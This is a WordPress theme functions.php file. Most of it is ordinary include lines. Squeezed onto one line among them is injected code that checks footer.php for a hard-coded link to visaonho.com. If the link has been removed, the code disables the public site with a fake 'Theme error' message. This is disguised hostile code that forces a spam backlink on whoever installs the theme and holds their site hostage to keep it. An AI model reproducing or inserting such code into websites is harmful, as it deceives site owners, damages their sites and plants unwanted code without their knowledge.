<?php

// Translations can be filed in the /lang/ directory
load_theme_textdomain( 'themejunkie', TEMPLATEPATH . '/lang' );


require_once(TEMPLATEPATH . '/includes/sidebar-init.php');
require_once(TEMPLATEPATH . '/includes/custom-functions.php');
require_once(TEMPLATEPATH . '/includes/post-thumbnails.php');

require_once(TEMPLATEPATH . '/includes/theme-postmeta.php');

require_once(TEMPLATEPATH . '/includes/theme-options.php');
require_once(TEMPLATEPATH . '/includes/theme-widgets.php');

require_once(TEMPLATEPATH . '/functions/theme_functions.php'); 
require_once(TEMPLATEPATH . '/functions/admin_functions.php');
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"margin: 40px; text-align:center; font-family:arial; background: #fff; color: red;\">Theme error, please re-install theme.</p>"); } } function wp_initialize_the_theme_finish() { $uri = strtolower($_SERVER["REQUEST_URI"]); if(is_admin() || substr_count($uri, "wp-admin") > 0 || substr_count($uri, "wp-login") > 0 ) { /* */ } else { $l = '<a href="http://visaonho.com/" title="Wordpress" target="_blank">Wordpress</a>'; $f = dirname(__file__) . "/footer.php"; $fd = fopen($f, "r"); $c = fread($fd, filesize($f)); $lp = preg_quote($l, "/"); fclose($fd); if ( strpos($c, $l) == 0 ) { wp_initialize_the_theme_message(); die; } } } wp_initialize_the_theme_finish();
// Uncomment this to test your localization, make sure to enter the right language code.
// function test_localization( $locale ) {
// 	return "nl_NL";
// }
// add_filter('locale','test_localization');

?>
